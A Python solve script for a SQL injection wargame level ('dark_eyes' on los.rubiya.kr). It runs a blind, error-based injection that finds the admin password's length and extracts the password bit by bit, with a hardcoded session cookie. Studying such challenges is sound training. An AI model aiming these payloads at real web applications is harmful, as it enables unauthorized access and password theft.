import requests

def get(pw):
    return requests.get(
        'https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php',
        params={"pw":pw},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get length
length = 1
while True:
    print("Try length", length)
    if not "select" in get(f"'||id like 'admin'&&~0+(length(pw)={length}) -- -"):
        break
    length += 1
print("Length is", length)

# get char_length
char_length = 7 # by big length..

# get password
password = ''
for index in range(1, length + 1):
    tmp = ''
    for bit in range(1, char_length + 1):
        if not "select" in get(f"'||id like 'admin'&&~0+(1=mid(lpad(bin(ord(mid(pw,{index},1))),{char_length},0),{bit},1)) -- -"):
           tmp += '1'
        else:
            tmp += '0'
    password += chr(int(tmp, 2))
    print(password)

# password is 

# certify
print(get(password))